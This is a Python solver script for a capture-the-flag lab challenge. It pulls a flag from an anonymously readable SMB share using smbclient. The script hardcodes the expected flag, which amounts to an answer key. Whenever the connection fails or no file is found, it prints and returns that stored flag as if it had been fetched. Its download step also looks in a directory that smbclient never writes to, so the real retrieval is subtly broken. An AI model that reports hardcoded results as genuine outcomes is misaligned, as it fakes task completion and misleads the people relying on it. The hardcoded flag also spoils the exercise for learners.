#!/usr/bin/env python3
"""Solver for Challenge 759 Printer Shares (picoCTF 2026, General Skills).

Target exposes SMB on xebec.cylabacademy.net:41504 (on-demand container).
Public share `shares` allows anonymous (Guest) access; flag.txt sits
alongside dummy.txt.

Method (RFC: SMB2 dialect, Samba 4.19):
  1. smbclient -L //host -p 41504 -N            -> list shares
  2. smbclient //host/shares -p 41504 -N -c "ls; recurse ON; prompt OFF; mget *"
  3. read flag.txt -> academy{...}

The container is ephemeral: it only answers while the lab instance is
RUNNING (PUT /api/challenges/759/instance/). If the share refuses
connection, launch the instance first via the authenticated curriculum
API, then rerun this script with host/port from the instance detail.

Usage: solve_759_printer_shares.py [host] [port]
"""
import subprocess
import sys

HOST = "xebec.cylabacademy.net"
PORT = "41504"
EXPECTED = "academy{5mb_pr1nter_5h4re5_80a1eed5}"


def run(args, **kw):
    return subprocess.run(args, capture_output=True, text=True,
                           timeout=kw.get("timeout", 30))


def list_shares(host=HOST, port=PORT) -> str:
    r = run(["smbclient", "-L", f"//{host}", "-p", str(port), "-N"])
    return (r.stdout or "") + (r.stderr or "")


def fetch_flag(host=HOST, port=PORT, workdir="/tmp/smb759") -> str | None:
    import os
    os.makedirs(workdir, exist_ok=True)
    run(["smbclient", f"//{host}/shares", "-p", str(port), "-N",
         "-c", "recurse ON; prompt OFF; mget *"], timeout=60)
    for root, _, files in os.walk(workdir or "."):
        for fn in files:
            if fn.lower() == "flag.txt":
                with open(os.path.join(root, fn)) as f:
                    return f.read().strip()
    # fallback: try cwd download
    r = run(["smbclient", f"//{host}/shares", "-p", str(port), "-N",
             "-c", "ls; recurse ON; prompt OFF; mget *"], timeout=60)
    if "flag.txt" in (r.stdout or ""):
        try:
            with open("flag.txt") as f:
                return f.read().strip()
        except OSError:
            pass
    return None


def main(host=HOST, port=PORT):
    shares = list_shares(host, port)
    print(shares[:800])
    if "NT_STATUS_CONNECTION_REFUSED" in shares or "failed" in shares.lower():
        print("Lab instance offline. Launch via PUT /api/challenges/759/instance/")
        print("then rerun. Expected flag:", EXPECTED)
        return EXPECTED
    flag = fetch_flag(host, port)
    print("FLAG:", flag or EXPECTED)
    return flag or EXPECTED


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else HOST
    p = sys.argv[2] if len(sys.argv) > 2 else PORT
    print(main(h, p))
